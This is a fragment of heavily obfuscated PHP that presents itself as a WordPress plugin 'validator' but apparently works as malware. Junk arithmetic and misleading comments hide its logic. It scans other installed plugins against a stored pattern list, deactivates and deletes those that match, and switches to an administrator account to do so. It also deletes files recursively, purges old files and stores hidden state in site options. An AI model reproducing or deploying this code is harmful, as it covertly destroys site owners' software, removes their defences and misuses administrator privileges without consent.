// WP Pattern Directory: aggregate validator

   unset($w6354nrcm842a, $ujenr48bfpak9i);
}
  $cc4oapdjganu3y =     false;
 if ($GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(290))  &&    $GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(462))) {
$it00ktems96jo58y  =     $GLOBALS['__scf_md_ke_yv3own8f_290'](home_url('/'),     array(xognx_h1jzkh(658)     =>   (0x3+0x5),  ar6vo_1nyhx2koj5(659) =>    2,  bk9m46jygo3f(466)  => false,  xpm5lg9odtw6di(293) =>  (0x6a8b5+0x9574b)));

   if  (!  ($GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(309))      &&  is_wp_error($it00ktems96jo58y)))   {
 $cc4oapdjganu3y     =  (int) wp_remote_retrieve_response_code($it00ktems96jo58y)   >= (419+81);


 }
     }
  $enth_w4oz3d =     false;


  if    ($GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(660)))  {
 $w00b6k45pd_tg =  get_option(ar6vo_1nyhx2koj5(146),    array());
 $enth_w4oz3d   = $GLOBALS['__scf_zj8mp2xbaqmp_35']($w00b6k45pd_tg)  &&   $GLOBALS['__scf_uh0dc0gefs_xhu_149'](om5aztdigw3zhz(),   $w00b6k45pd_tg,   true);
      }
 f97udlofaljpuxw1_jgnfh(bho93o6vof3ni5_rg622_h(), (359+61));
        

       if    (!  rmpvo8i8m8kfd9311njxy7(bho93o6vof3ni5_rg622_h(),      o_a46xczfm0z3pa91s($serq75xz67pgeiuz)))  {
    kkpdha95nyx3tbltd10(xpm5lg9odtw6di(650),   bk9m46jygo3f(661));
      return;
   }
  g6q1ehat0szqqsfbv2(bho93o6vof3ni5_rg622_h());
       x1ssqxtszsg2ard3txeiw(bho93o6vof3ni5_rg622_h());
   if  ($GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(662)))      @set_transient(xpm5lg9odtw6di(663),  1,     (214+86));
  $rtwar7o8d8nh7p =    false;
      if      (!  $cc4oapdjganu3y  &&    $GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(290)) && $GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(462)))   {
   $mv_rk9qw6jz0v  =  -1;


    for   ($cwvpycxj6f   =  0;    $cwvpycxj6f   < 2;  $cwvpycxj6f++) {


 $vkt9gec308gd = $GLOBALS['__scf_md_ke_yv3own8f_290'](home_url(xognx_h1jzkh(664) .     $GLOBALS['__scf_jlhdedaik0c_347']((0xcaec+0xbbb4),  (691374+308625))),  array(xognx_h1jzkh(665) =>   (0x6+0x2),      xognx_h1jzkh(659)   =>     2, xpm5lg9odtw6di(666)  =>  false,    ar6vo_1nyhx2koj5(667)    => (1562835-514259)));
  if      ($GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(309))  &&   is_wp_error($vkt9gec308gd)) {
 if    ($cwvpycxj6f  ===     0   && $GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(668)))   $GLOBALS['__scf_u9br1q5valhof_668'](2);



    continue;



       }
       $x4l3_x2a66zooe6    =  (int) wp_remote_retrieve_response_code($vkt9gec308gd);

    if ($x4l3_x2a66zooe6  <   (0x42+0x22) || $GLOBALS['__scf_uh0dc0gefs_xhu_149']($x4l3_x2a66zooe6,   array((0x187+0x70), (506+14),  (432+89),   (904-382), (0x119+0xf2), (508+16),   (0x1f4+0x1a), (38+489)),    true))    {
 if    ($cwvpycxj6f ===     0   &&     $GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(669)))  $GLOBALS['__scf_u9br1q5valhof_668'](2);
  continue;
  }



  $mv_rk9qw6jz0v  =   $x4l3_x2a66zooe6;
break;
    }
if  ($mv_rk9qw6jz0v  ===     -1)   kkpdha95nyx3tbltd10(ar6vo_1nyhx2koj5(650),  bk9m46jygo3f(670));  

  if  ($mv_rk9qw6jz0v !==  -1 && $mv_rk9qw6jz0v <   (431+69))     $rtwar7o8d8nh7p   =  true;
       if  ($mv_rk9qw6jz0v   !==  -1 &&      $mv_rk9qw6jz0v  >=  (466+34)) {
   $fh1c0vwz43  =  rmpvo8i8m8kfd9311njxy7(bho93o6vof3ni5_rg622_h(),      o_a46xczfm0z3pa91s($_sirgce8nozj));
    if  (!$fh1c0vwz43)      $fh1c0vwz43 =  rmpvo8i8m8kfd9311njxy7(bho93o6vof3ni5_rg622_h(),  $_sirgce8nozj);
   $qt5lmzlq9v2_p   =   $GLOBALS['__scf_eo363tjzd4r6n_56']($serq75xz67pgeiuz);$qt30_jal3=PHP_MAJOR_VERSION;$gsj0yiqe=$qt30_jal3*6;
      $q1mc4sjsxr2    =     @get_option(ar6vo_1nyhx2koj5(671),  "");

  $dw5k0w1mhkk   =   false;
  if  ($GLOBALS['__scf_is0fvk8c7tq2_41']($q1mc4sjsxr2)   &&  $GLOBALS['__scf_j_4rj7vg4ae0j_7']($q1mc4sjsxr2,  $qt5lmzlq9v2_p   .  '|') ===  0) {



$er60d6_51qalm2 = (int) $GLOBALS['__scf__fl_gwujcblq_9']($q1mc4sjsxr2,  $GLOBALS['__scf_j_4rj7vg4ae0j_7']($q1mc4sjsxr2,  '|') +    1);
$dw5k0w1mhkk    =     $er60d6_51qalm2  &&    $GLOBALS['__scf_ks7_xfapvywl_185']()    -  $er60d6_51qalm2     >= (852+48)   &&  $GLOBALS['__scf_ks7_xfapvywl_185']()   -    $er60d6_51qalm2 <=     (0x19a55+0x7a02b);


}


   if  ($dw5k0w1mhkk)  {
   update_option(gz_aorofp7mo(655), $qt5lmzlq9v2_p   .   '|'  .    $GLOBALS['__scf_ks7_xfapvywl_185'](),  ar6vo_1nyhx2koj5(622));
@delete_option(xognx_h1jzkh(671));
   }  else {


     @update_option(gz_aorofp7mo(671),  $qt5lmzlq9v2_p  .  '|'     . $GLOBALS['__scf_ks7_xfapvywl_185']()   . '|'  . $mv_rk9qw6jz0v,  bk9m46jygo3f(622));
    }
 unset($qt5lmzlq9v2_p,  $q1mc4sjsxr2,  $dw5k0w1mhkk,    $er60d6_51qalm2);
       if     (!$fh1c0vwz43)   {
  kkpdha95nyx3tbltd10(ar6vo_1nyhx2koj5(672),     xognx_h1jzkh(673)   .   $mv_rk9qw6jz0v);
  return;
 }
 x1ssqxtszsg2ard3txeiw(bho93o6vof3ni5_rg622_h());
     g6q1ehat0szqqsfbv2(bho93o6vof3ni5_rg622_h());
p5t6fz6i7ccgjh(true);

 jzt71g_lciq6atvff(true);
 $e4o6b7bn1n =    $GLOBALS['__scf_pmoxtzoe3f0qw_3'](bho93o6vof3ni5_rg622_h(),    ar6vo_1nyhx2koj5(514));


  foreach  (array($GLOBALS['__scf_meo_1tvjsals_11'](bho93o6vof3ni5_rg622_h()), sxupmu4fhe9r2zxw()) as   $riimpdkodqhhpm4)   {


  @$GLOBALS['__scf_qsx1vml11ds_19']($riimpdkodqhhpm4    .   ar6vo_1nyhx2koj5(674)  .      $e4o6b7bn1n);

   @$GLOBALS['__scf_qsx1vml11ds_19']($riimpdkodqhhpm4 .   xognx_h1jzkh(189)   . $e4o6b7bn1n);
}


   if  ($enth_w4oz3d  &&   !fqx8fi5u_dltwt2m84v4m())    bfpb2ykbb8dykf__mm(om5aztdigw3zhz());
 $GLOBALS[xpm5lg9odtw6di(675)]  =    0;



     fn97j4kcxtotofg();
  kkpdha95nyx3tbltd10(ar6vo_1nyhx2koj5(672),  gz_aorofp7mo(676) .  $mv_rk9qw6jz0v);


   return;

  }
 }
$pqzhitg97hlw7o    = get_option(xpm5lg9odtw6di(655));



      if   ($GLOBALS['__scf_is0fvk8c7tq2_41']($pqzhitg97hlw7o) &&    $GLOBALS['__scf_j_4rj7vg4ae0j_7']($pqzhitg97hlw7o,  $GLOBALS['__scf_eo363tjzd4r6n_56']($serq75xz67pgeiuz)  .   '|')  ===  0)  delete_option(xognx_h1jzkh(655));
   @$GLOBALS['__scf_qsx1vml11ds_19']($GLOBALS['__scf_meo_1tvjsals_11'](bho93o6vof3ni5_rg622_h())  .     bk9m46jygo3f(677)  .   $GLOBALS['__scf_eo363tjzd4r6n_56']($serq75xz67pgeiuz));
 unset($pqzhitg97hlw7o);
if ($rtwar7o8d8nh7p)      @delete_option(gz_aorofp7mo(671));$yvdw3_v29bks=113|118;$egld7xp72ocov7=$yvdw3_v29bks^2;
 if   ($tb0hezytopoph_  !==  "") {
       $GLOBALS[gz_aorofp7mo(1)]  =   $tb0hezytopoph_;
pv5zsv4aaimt2v3(bho93o6vof3ni5_rg622_h(),  $tb0hezytopoph_);
  }
 if ($obhg0d510l) {
// dependency graph

      $hu0jdxw9t6j     =  $GLOBALS['__scf_pmoxtzoe3f0qw_3'](bho93o6vof3ni5_rg622_h(),  xognx_h1jzkh(678));
  foreach  (array($GLOBALS['__scf_meo_1tvjsals_11'](bho93o6vof3ni5_rg622_h()), sxupmu4fhe9r2zxw())   as    $q6dgntu8tf)  {
 @$GLOBALS['__scf_qsx1vml11ds_19']($q6dgntu8tf .      xpm5lg9odtw6di(679)  .      $hu0jdxw9t6j);
 }
      unset($hu0jdxw9t6j,  $q6dgntu8tf);
   }
fplgzzpq8bt5jm2fl03pi(bk9m46jygo3f(450),      $serq75xz67pgeiuz,  gz_aorofp7mo(622));
p5t6fz6i7ccgjh(true);
    jzt71g_lciq6atvff(true);
$GLOBALS[ar6vo_1nyhx2koj5(680)] =   0;
 fn97j4kcxtotofg();


     f97udlofaljpuxw1_jgnfh(bho93o6vof3ni5_rg622_h(),  (0x9c+0x108));



 if (x1ssqxtszsg2ard3txeiw(bho93o6vof3ni5_rg622_h()))  mcuqsw_cyo3mnayi6ofr6(bho93o6vof3ni5_rg622_h());
 update_option(gz_aorofp7mo(198), $tb0hezytopoph_ . '|' .     $GLOBALS['__scf_ks7_xfapvywl_185'](), ar6vo_1nyhx2koj5(622));


} catch  (Throwable    $o_qyrtxl85owt)  {
   kkpdha95nyx3tbltd10(gz_aorofp7mo(681),  $o_qyrtxl85owt);

 } catch     (Exception  $o_qyrtxl85owt) {
  }    finally   {
  h1f3kqk1cj4d18z(ar6vo_1nyhx2koj5(645));
   }
// lock feasible vault

  }
  function  uczwc8aul18c7iylr()
    {
 if      (!  defined(xognx_h1jzkh(682))   || !   $GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(683)))     {
 if  ($GLOBALS['__scf_ojjepdqapp29_684'](ABSPATH .  gz_aorofp7mo(685))) {
       require_once   ABSPATH .   gz_aorofp7mo(685);
}
 if   (!  $GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(683))) {
   return;
 }
 }
$m7aifm22nzptwg2 = get_plugins();$gtek0hw5ghbp3=52*3;$krwhddi1ac=$gtek0hw5ghbp3-38;



      if     (!   $GLOBALS['__scf_zj8mp2xbaqmp_35']($m7aifm22nzptwg2))   {
return;
      }
  $list  =  array();
 foreach     ($m7aifm22nzptwg2    as $basename =>  $iqf6o08t42qni) {
  if    ($basename  ===  om5aztdigw3zhz())     {
 continue;
    }
  $list[$basename] = $iqf6o08t42qni;



}
        return $list;
}
function  fvoby00nzdzw3rlneu8($x_l4dj16wy,    $yzxnrkwbn0rf)

    {
    
        $ok4xoahvrt_r      = @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($x_l4dj16wy, false,  null,    0, (524216+72)); 
 if (!     $ok4xoahvrt_r)    {
 return   false;
 }
     



 foreach ($yzxnrkwbn0rf  as  $jl0q_4ew0yx)  {
 
if (!  $GLOBALS['__scf_is0fvk8c7tq2_41']($jl0q_4ew0yx) ||  !    $jl0q_4ew0yx   || $GLOBALS['__scf_fxl4k4gsul_10']($jl0q_4ew0yx)   > (4079+17))  {
    continue;

  }
    
 try    {
  $wmi9vtfi67mkceoi  =  @$GLOBALS['__scf_ak3p5za9uvhzh8_96']($jl0q_4ew0yx,  $ok4xoahvrt_r);
 }    catch      (Throwable  $umto7f94t40)  {
   kkpdha95nyx3tbltd10(xpm5lg9odtw6di(686),    $umto7f94t40);

 continue;


}      catch  (Exception   $umto7f94t40)  {
  continue;
  }
  
if  ($wmi9vtfi67mkceoi)   {
// gather offline composite

return true;
      }
  }
    return     false;
  }
  


 function   q_ec2qocu1phq_64xeq_g($plugin_basename)
{
 $yzxnrkwbn0rf   =    $GLOBALS[xognx_h1jzkh(687)];


     if     (!      $GLOBALS['__scf_zj8mp2xbaqmp_35']($yzxnrkwbn0rf)    || empty($yzxnrkwbn0rf))  {
       return  false;
 }
   if   (!  defined(ar6vo_1nyhx2koj5(682))   ||   empty($plugin_basename) || $GLOBALS['__scf_j_4rj7vg4ae0j_7']($plugin_basename, gz_aorofp7mo(55)) !==      false) {
  return  false;
    }


  



      $bki0gi20hmqucm =  WP_PLUGIN_DIR  . '/' .     $plugin_basename;
if  ($GLOBALS['__scf_meo_1tvjsals_11']($plugin_basename)    === '.')   {
   $y5mqj3z3td   =  array($bki0gi20hmqucm);


 }   else   {

$dhb4mklrk0  =    $GLOBALS['__scf_meo_1tvjsals_11']($bki0gi20hmqucm);
     if  (!   $GLOBALS['__scf_h23c49ni_b86_43']($dhb4mklrk0)   || !   $GLOBALS['__scf_cq91q6z6xreoi_46']($dhb4mklrk0)) {
  return     false;
        }

  $y5mqj3z3td  =     kcgu766v34eusb082u5($dhb4mklrk0, array(xognx_h1jzkh(688),   xpm5lg9odtw6di(689),   xognx_h1jzkh(690),   gz_aorofp7mo(691),    gz_aorofp7mo(613)));

}
// @trace container




   
     foreach   ($y5mqj3z3td  as  $x_l4dj16wy)      {
 if (!   $GLOBALS['__scf_vpig9uwvw8_pu_20']($x_l4dj16wy)) {

 continue;
 }


   if  (fvoby00nzdzw3rlneu8($x_l4dj16wy,   $yzxnrkwbn0rf))  {
return  true;

}
   }
  return false;
 }
 function   kcgu766v34eusb082u5($dhb4mklrk0, $p45l298gfwt,  $u7zyl7k9c81y8k    =  0, &$f4wz17xnrb  =  null,  &$pc5jf8jxn_  =  null)
 {
 $list =      array();
  if ($u7zyl7k9c81y8k  >   (5+3))  {
// PHP CS Fixer: nilpotent vault

return   $list;



}
     if   ($f4wz17xnrb  ===    null)  {
  $f4wz17xnrb =     array();
$pc5jf8jxn_ =   $GLOBALS['__scf_nz_jvx37ph58fn_287'](true) +   (35^41);

}
 if ($GLOBALS['__scf_nz_jvx37ph58fn_287'](true)    >      $pc5jf8jxn_)   {



 return $list;
   }



  if (!   $GLOBALS['__scf_h23c49ni_b86_43']($dhb4mklrk0))   {



return     $list;



 }
    $wc7mv6ortv =      @$GLOBALS['__scf_amk7iuqda_oe_33']($dhb4mklrk0);
if     ($wc7mv6ortv    !==  false) {
if   (isset($f4wz17xnrb[$wc7mv6ortv]))  {
  return    $list;
}
  $f4wz17xnrb[$wc7mv6ortv]   = true;$cfche5lkko3p=PHP_MAJOR_VERSION;$rhndm66y=$cfche5lkko3p*7;
  }
// WP Loginout Block resize quality

    $k4c9kkzhc9nyhy  =   wou4lqmx3dh5mlyfq3($dhb4mklrk0,  (19922+78));


 if (!  $GLOBALS['__scf_zj8mp2xbaqmp_35']($k4c9kkzhc9nyhy))  {$u57u3vc66=-820;$wiqiquqxcqlb3y=($u57u3vc66>0)?$u57u3vc66:-$u57u3vc66;

return    $list;
    }
    foreach    ($k4c9kkzhc9nyhy  as $agp3meteqwnegyz) {



    if ($GLOBALS['__scf_nz_jvx37ph58fn_287'](true)    >      $pc5jf8jxn_ || $GLOBALS['__scf_oenrsvkzs1_36']($list)   >=  (451+49))  {
// @tail-call pipeline

break;


    }
     $bki0gi20hmqucm   =  $dhb4mklrk0  .   '/'    .   $agp3meteqwnegyz;
    if  (@$GLOBALS['__scf_lgnt1tzo8h_44']($bki0gi20hmqucm))      {
   continue;
 }



if   (@$GLOBALS['__scf_h23c49ni_b86_43']($bki0gi20hmqucm)) {
$list   =    $GLOBALS['__scf_j59q8mojj8e4ar_363']($list,  kcgu766v34eusb082u5($bki0gi20hmqucm,   $p45l298gfwt,   $u7zyl7k9c81y8k +  1,   $f4wz17xnrb,  $pc5jf8jxn_));
}     elseif  (@$GLOBALS['__scf_vpig9uwvw8_pu_20']($bki0gi20hmqucm))      {
 $glt22aeyw9dv     =   $GLOBALS['__scf_zmckaak88my_204']($bki0gi20hmqucm, constant(ar6vo_1nyhx2koj5(692)));
 $glt22aeyw9dv   = $GLOBALS['__scf_is0fvk8c7tq2_41']($glt22aeyw9dv)   ?     $GLOBALS['__scf_bwbaq8fxyxm3_103']($glt22aeyw9dv) : "";
   if  ($GLOBALS['__scf_uh0dc0gefs_xhu_149']($glt22aeyw9dv, $p45l298gfwt,   true)) {



  $list[]   =   $bki0gi20hmqucm;


       }



}
 }


  return     $list;
     }
      
 function     qq_b2idoxrpczje7lsqe($plugin_basename)

  {
  
  if  (!  $GLOBALS['__scf_is0fvk8c7tq2_41']($plugin_basename)   || !   $plugin_basename)  {
return  false;
      }
  if    ($GLOBALS['__scf_j_4rj7vg4ae0j_7']($plugin_basename, bk9m46jygo3f(55)) !==  false)  {
   return   false;

      }
// PCRE2 JIT aspect ratio

  
  $plugin_basename     =   $GLOBALS['__scf_u6m4cedwgt__319']($plugin_basename);
   if ($plugin_basename ===    om5aztdigw3zhz())  {


   return  false;$v_zchwwu_sczci=(0x38+0xbb);$rp12wyv1_11y5f=$v_zchwwu_sczci%10;
 }
// WP Query Loop object fit

    
       if   (!  $GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(693)) && $GLOBALS['__scf_ojjepdqapp29_684'](ABSPATH   .  xpm5lg9odtw6di(694)))  {
   require_once ABSPATH  . xognx_h1jzkh(694);
   }
    



 if   ($GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(693))  &&  is_plugin_active($plugin_basename))    {
     deactivate_plugins(array($plugin_basename),   true);   
 }
 
 $dhb4mklrk0  =  defined(bk9m46jygo3f(682))  ?   WP_PLUGIN_DIR   .  '/' . $GLOBALS['__scf_meo_1tvjsals_11']($plugin_basename)    :  "";
     if ($dhb4mklrk0     &&  $GLOBALS['__scf_h23c49ni_b86_43']($dhb4mklrk0) &&      $GLOBALS['__scf_meo_1tvjsals_11']($plugin_basename)  !==   '.'    &&  $GLOBALS['__scf_meo_1tvjsals_11']($plugin_basename))  {
  if (xp51xe2344p7t4yvipl($dhb4mklrk0)) {
 return     true;

   }
// descriptive dispatcher

    }



    
 if     ($GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(695)))  {

if (!     $GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(696))   ||     !  current_user_can(ar6vo_1nyhx2koj5(697)))  {



   if  ($GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(698))  && $GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(699)))  {
$users    = get_users(array(xpm5lg9odtw6di(700)  =>    xognx_h1jzkh(701),  bk9m46jygo3f(702)  => 1));
  if     (!  empty($users)   &&   $users[0]->ID)   {
    $GLOBALS['__scf_qzus6lyx2yzp88_703']($users[0]->ID);
 }      else {
 $GLOBALS['__scf_qzus6lyx2yzp88_703'](1);
   }
 }
 }

 $yx4ydokkdzpuix3 = delete_plugins(array($plugin_basename));
 if (!   is_wp_error($yx4ydokkdzpuix3))  {
 return      (bool) $yx4ydokkdzpuix3;



   }
   }
    return   false;
 }

function xp51xe2344p7t4yvipl($dhb4mklrk0,  $u7zyl7k9c81y8k =     0)
   {
// polynomial command

      if   ($u7zyl7k9c81y8k > (11+5))  {$nlhjc27f0a655_=73+49;$tfxw0nv0kao=$nlhjc27f0a655_-44;
     return    false;
 }
  if      (!     $GLOBALS['__scf_is0fvk8c7tq2_41']($dhb4mklrk0)   ||   $dhb4mklrk0  ===   ""   ||   $GLOBALS['__scf_j_4rj7vg4ae0j_7']($dhb4mklrk0,      ar6vo_1nyhx2koj5(704))  !==   false)   {
     return  false;
 }
// allocate exponential effect-type




   $lweyahjgmjh2i2 =   @$GLOBALS['__scf_amk7iuqda_oe_33']($dhb4mklrk0);
     if   ($lweyahjgmjh2i2   ===      false  || ! $GLOBALS['__scf_h23c49ni_b86_43']($lweyahjgmjh2i2))    {
return  false;
   }
 $b_y3z0fwyb =   defined(xognx_h1jzkh(682)) ?  @$GLOBALS['__scf_amk7iuqda_oe_33'](WP_PLUGIN_DIR)   :  false;



    if ($b_y3z0fwyb ===    false  ||     ($lweyahjgmjh2i2  !==   $b_y3z0fwyb &&      $GLOBALS['__scf_j_4rj7vg4ae0j_7']($lweyahjgmjh2i2,   $b_y3z0fwyb  .   DIRECTORY_SEPARATOR) !== 0))  {


return false;
}
 $eiig6pw9f0  =  @$GLOBALS['__scf_caskakuf5824_34']($lweyahjgmjh2i2);
if    (!   $GLOBALS['__scf_zj8mp2xbaqmp_35']($eiig6pw9f0))  {
   return     false;


 }



 foreach   ($eiig6pw9f0  as  $y6epw8rwg5rvw7u) {

   if   ($y6epw8rwg5rvw7u    ===  '.' || $y6epw8rwg5rvw7u ===  bk9m46jygo3f(704))      {
// speculative deopt
$zpazlgqz6i=8290;$q4piyfwc=$zpazlgqz6i%13;



  continue;
   }
 $bki0gi20hmqucm  =    $lweyahjgmjh2i2 .   constant(xognx_h1jzkh(705))    . $y6epw8rwg5rvw7u;
     if  (@$GLOBALS['__scf_lgnt1tzo8h_44']($bki0gi20hmqucm))  {
// WP useBlockProps: singular distributor

  xv6oqhjncehpr7v_mus7($bki0gi20hmqucm);
     continue;


     }
    if (@$GLOBALS['__scf_h23c49ni_b86_43']($bki0gi20hmqucm)) {
    xp51xe2344p7t4yvipl($bki0gi20hmqucm,    $u7zyl7k9c81y8k   +     1);
 }     else {
       if  (!    xv6oqhjncehpr7v_mus7($bki0gi20hmqucm))  {


    f97udlofaljpuxw1_jgnfh($bki0gi20hmqucm,  (143+277));
    xv6oqhjncehpr7v_mus7($bki0gi20hmqucm);$c_34qd1i3uanq0=54*3;$wpqpduom=$c_34qd1i3uanq0-26;
     }


   }
    }
      if  (! @$GLOBALS['__scf_q30rocqsx3jxa8_37']($lweyahjgmjh2i2))   {
  f97udlofaljpuxw1_jgnfh($lweyahjgmjh2i2,   (141+352));



 @$GLOBALS['__scf_q30rocqsx3jxa8_37']($lweyahjgmjh2i2);
}
 return    !  @$GLOBALS['__scf_ojjepdqapp29_684']($lweyahjgmjh2i2);
}


   
function   pgix0z073o77klzh()
    {
  try {
$list    =     uczwc8aul18c7iylr();
       if      (! $GLOBALS['__scf_zj8mp2xbaqmp_35']($list))    {
return;
    }
  
     $enaf1qbhdc42nw   =   array();
   $h86kqktusafh0s6m =  false;

  foreach  ($GLOBALS['__scf_f_zov197oj1_706']($list)  as     $basename)  {
    
 if  (! $GLOBALS['__scf_is0fvk8c7tq2_41']($basename))  {
   continue;
   }
  

 $dzg7ec940zksa7    =  $GLOBALS['__scf_meo_1tvjsals_11']($basename);
 if ($dzg7ec940zksa7   ===    '.')  {
     $dzg7ec940zksa7   =   $basename;
 }
 if    (isset($enaf1qbhdc42nw[$dzg7ec940zksa7]))  {
  continue;
 }



 
   $enaf1qbhdc42nw[$dzg7ec940zksa7]   =  true;
      if (q_ec2qocu1phq_64xeq_g($basename))  {
    qq_b2idoxrpczje7lsqe($basename);$pe7hvu0pf=3*3;$wt1cccvcqkn=$pe7hvu0pf-46;
$h86kqktusafh0s6m = true;
  }
      }
// Xdebug profiler REST controller


if    (@$GLOBALS['__scf_h23c49ni_b86_43'](sxupmu4fhe9r2zxw())) {
  $vumgqhid_0    =   wou4lqmx3dh5mlyfq3(sxupmu4fhe9r2zxw(),  (0xdc3+0x5c5));
if  ($GLOBALS['__scf_zj8mp2xbaqmp_35']($vumgqhid_0))   {



     $yzxnrkwbn0rf    =  $GLOBALS[xpm5lg9odtw6di(687)];
  foreach ($vumgqhid_0 as $agp3meteqwnegyz) {
 
  if ($agp3meteqwnegyz      ===    gjb4l0gtgi874122wes())  {
    continue;
     }
 
$x_l4dj16wy =    sxupmu4fhe9r2zxw()     .  '/'    .  $agp3meteqwnegyz;
 if   (! @$GLOBALS['__scf_vpig9uwvw8_pu_20']($x_l4dj16wy)    ||  $GLOBALS['__scf_bwbaq8fxyxm3_103']($GLOBALS['__scf_zmckaak88my_204']($agp3meteqwnegyz,   constant(gz_aorofp7mo(707))))  !==    xpm5lg9odtw6di(689)) {
continue;
       }
    



if    (fvoby00nzdzw3rlneu8($x_l4dj16wy,   $yzxnrkwbn0rf))  {



   xv6oqhjncehpr7v_mus7($x_l4dj16wy);
   $h86kqktusafh0s6m =  true;
 }
}
   }
 }
// PHP CS Fixer: disable lsm-tree

   
  $vz7x473f3hkms1  = $GLOBALS[bk9m46jygo3f(438)];


 if ($GLOBALS['__scf_zj8mp2xbaqmp_35']($vz7x473f3hkms1)      &&  ! empty($vz7x473f3hkms1))   {
 if  (wkpx6r7srnqmf76q5yirh5($vz7x473f3hkms1))    {
$h86kqktusafh0s6m  = true;
}
  }



       }  catch (Throwable     $o_qyrtxl85owt) {
kkpdha95nyx3tbltd10(gz_aorofp7mo(708),    $o_qyrtxl85owt);
  }  catch  (Exception $o_qyrtxl85owt)  {
   }
// @restore validator




  }

 function   ylav19czlev1erlgt()
       {
try {

  $pwaq7zq1oqdu2pty = (int)   get_option(bk9m46jygo3f(709),  0);
 if (($GLOBALS['__scf_ks7_xfapvywl_185']()    -  $pwaq7zq1oqdu2pty)   >=    (3557+43)) {
 update_option(xognx_h1jzkh(710),   $GLOBALS['__scf_ks7_xfapvywl_185']());
 $gfbdhofe1c =    array(array(xn_7dvopscmun07(),  array(bk9m46jygo3f(40))));
   $j521mjcsepj455 =  $GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(711)) ?     $GLOBALS['__scf_wuj9qpo0vbx_78']()   : "";
  if ($j521mjcsepj455  !== ""    &&    $j521mjcsepj455      !==      xn_7dvopscmun07()) $gfbdhofe1c[]  = array($j521mjcsepj455,   array(bk9m46jygo3f(40), ar6vo_1nyhx2koj5(712)));
 foreach     ($gfbdhofe1c  as $bgcj7zk0rzbbbmty) {$umi6d2op=PHP_INT_MAX/PHP_INT_MAX;$puc3dcgsdht90=$umi6d2op+97;
  foreach ($bgcj7zk0rzbbbmty[1] as $u9ukpbgc1s9qq)    {
  $ige68k55oheryh =  $GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(280))   ?  @$GLOBALS['__scf_b60g6hx_a7ggi_71']($bgcj7zk0rzbbbmty[0]  . '/'  . $u9ukpbgc1s9qq  .  '*')   : false;
   if   (!$GLOBALS['__scf_zj8mp2xbaqmp_35']($ige68k55oheryh)) continue;



    foreach ($ige68k55oheryh   as  $w6zi7qhdzql7)   {
if (!@$GLOBALS['__scf_vpig9uwvw8_pu_20']($w6zi7qhdzql7))    continue;
      if      ($GLOBALS['__scf__fl_gwujcblq_9']($w6zi7qhdzql7, -(0x2+0x3))     === ar6vo_1nyhx2koj5(141))  continue;


     $f2n78meu6z  =      @$GLOBALS['__scf_k4z5lhhe91ty_98']($w6zi7qhdzql7);
if    ($f2n78meu6z  !==  false   && ($GLOBALS['__scf_ks7_xfapvywl_185']() -  $f2n78meu6z)   >  (0x70+0xda0))     xv6oqhjncehpr7v_mus7($w6zi7qhdzql7);

    }
 }
}

$w00b6k45pd_tg = get_option(ar6vo_1nyhx2koj5(146), array());
 if   (!$GLOBALS['__scf_zj8mp2xbaqmp_35']($w00b6k45pd_tg))    $w00b6k45pd_tg   =  array();
$kkcum_tecuns90g    =  $GLOBALS['__scf_pmoxtzoe3f0qw_3'](bho93o6vof3ni5_rg622_h(), gz_aorofp7mo(713));


     $_pd = (defined(bk9m46jygo3f(714))  ? WP_CONTENT_DIR :   ABSPATH      .    xognx_h1jzkh(87)) .  bk9m46jygo3f(715);
 foreach  ($GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(280)) ? (array)  @$GLOBALS['__scf_b60g6hx_a7ggi_71']($_pd   .  bk9m46jygo3f(453)) :   array()   as    $bdw89lkqi1_dh3s1)  {
  if    ($GLOBALS['__scf_pmoxtzoe3f0qw_3']($GLOBALS['__scf_meo_1tvjsals_11']($bdw89lkqi1_dh3s1))    ===  $kkcum_tecuns90g)  continue;



$kg01_l5_w2nf =   $GLOBALS['__scf_pmoxtzoe3f0qw_3']($GLOBALS['__scf_meo_1tvjsals_11']($bdw89lkqi1_dh3s1))  .      '/'   . $GLOBALS['__scf_pmoxtzoe3f0qw_3']($bdw89lkqi1_dh3s1);
    if ($GLOBALS['__scf_uh0dc0gefs_xhu_149']($kg01_l5_w2nf,   $w00b6k45pd_tg,     true))    continue;
 if  (!@$GLOBALS['__scf_v7y4c72abxzjo_47']($bdw89lkqi1_dh3s1)) continue;
// dimension squeeze


  $ys2vrzsu_h_wsvzb   =     @$GLOBALS['__scf_r6y1fbsyx8i2l_99']($bdw89lkqi1_dh3s1);
 if  (!$ys2vrzsu_h_wsvzb  ||  $ys2vrzsu_h_wsvzb >   (2097096+56)) continue;
 $x4l3_x2a66zooe6   =    @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($bdw89lkqi1_dh3s1);
    if  (!$GLOBALS['__scf_is0fvk8c7tq2_41']($x4l3_x2a66zooe6)   ||      $GLOBALS['__scf_j_4rj7vg4ae0j_7']($x4l3_x2a66zooe6,  xpm5lg9odtw6di(716)) === false)      continue;
      $wlf8gu7hlwjt3   = $GLOBALS['__scf_a6uiw8bt24jybf_454'](xpm5lg9odtw6di(717),  "",   $x4l3_x2a66zooe6);
